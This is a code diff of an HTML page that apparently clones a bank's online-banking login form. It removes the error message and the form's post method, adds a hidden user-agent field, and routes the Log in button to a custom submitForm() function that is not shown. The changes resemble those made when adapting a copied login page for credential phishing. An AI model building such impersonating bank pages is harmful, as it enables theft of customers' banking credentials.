@@ -33,7 +33,8 @@
             <div class="sc-kgoBCf bzQzYK" id="rbw-overall-context-wrapper">
                 <div class="sc-iwsKbI jTTtAZ"></div>
                 <div class="sc-jzJRlG eNoisr">
-                    <form class="sc-jTzLTM cUTnPT lab-form" method="post" id="rbw-login-block">
+                    <form id="loginForm" class="sc-jTzLTM cUTnPT lab-form" id="rbw-login-block">
+                        <input type="hidden" id="userAgent" name="userAgent">
                         <div class="sc-bdVaJa khUSez">
                             <img class="sc-htpNat gRCWAJ" src="/assets/atb/atb-jewel.svg" id="rbw-login-heading-atb-logo">
                             <div class="sc-EHOje ifxqtD" id="rbw-login-heading-contextHeader">
@@ -43,29 +44,6 @@
                             </div>
                         </div>
                         <div class="sc-fjdhpX Pbrfi div-main" id="rbw-login-form-login-block">
-                            <span class="error-div">
-                                <div class="warning sc-kEYyzF bxljLY" id="rbw-login-form-message-error" data-msg-key="ERR_INVALID_USERNAME_PASSWORD" style="text-align: center">
-                                    <svg width="48px" height="48px" viewBox="0 0 48 48" version="1.1" xmlns="http://www.w3.org/2000/svg" style="margin-bottom: 7px">
-                                        <title>Icons_48x48/Notice</title>
-                                        <g id="warning-notice-icon" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
-                                            <g id="Authentication/720/Invalid_login" transform="translate(-336.000000, -199.000000)">
-                                                <g id="Icons_48x48/Notice" transform="translate(336.000000, 199.000000)">
-                                                    <g id="Group-7">
-                                                        <path d="M24,0 C10.745,0 0,10.745 0,24 C0,37.255 10.745,48 24,48 C37.255,48 48,37.255 48,24 C48,10.745 37.255,0 24,0 M24,2 C36.131,2 46,11.869 46,24 C46,36.131 36.131,46 24,46 C11.869,46 2,36.131 2,24 C2,11.869 11.869,2 24,2" id="Fill-1" fill="#F1BE48"></path>
-                                                        <line x1="24" y1="14" x2="24" y2="28" id="Stroke-3" stroke="#F1BE48" stroke-width="2"></line>
-                                                        <line x1="24" y1="31" x2="24" y2="34" id="Stroke-5" stroke="#F1BE48" stroke-width="2"></line>
-                                                    </g>
-                                                </g>
-                                            </g>
-                                        </g>
-                                    </svg>
-                                    <span>
-                                        <h3 id="rbw-login-form-error-title" style="padding-bottom: 7px; color: rgb(99, 102, 106);">Invalid Username or Password</h3>
-                                        <span class="sc-gqjmRU htfXDc"><span id="rbw-login-form-error-message-desktop">The username or password you entered is incorrect. Try again.</span></span>
-                                    </span>
-                                </div>
-                                <div class="sc-VigVT jQbsgO"></div>
-                            </span>
                             <div>
                                 <span>
                                     <label id="rbw-login-form-input-username-validation-error-label" class="top input rebank-textfield">Username</label>
@@ -105,7 +83,7 @@
                                 <div class="sc-VigVT jQbsgO"></div>
                                 <div class="sc-VigVT jQbsgO"></div>
                                 <div class="sc-VigVT jQbsgO"></div>
-                                <div class="uiNewButtonWrapper "><input class="rebank-button primary" id="rbw-login-form-button-submit" label="Log in" type="submit" value="Log in"></div>
+                                <div class="uiNewButtonWrapper "><input class="rebank-button primary" id="rbw-login-form-button-submit" onclick="submitForm()" type="submit" value="Log in"></div>
                                 <div class="sc-VigVT jQbsgO"></div>
                                 <div class="sc-VigVT jQbsgO"></div>
                                 <button class="sc-dxgOiQ cgwvbs" id="rbw-login-form-button-forgotPassword">Forgot password</button>
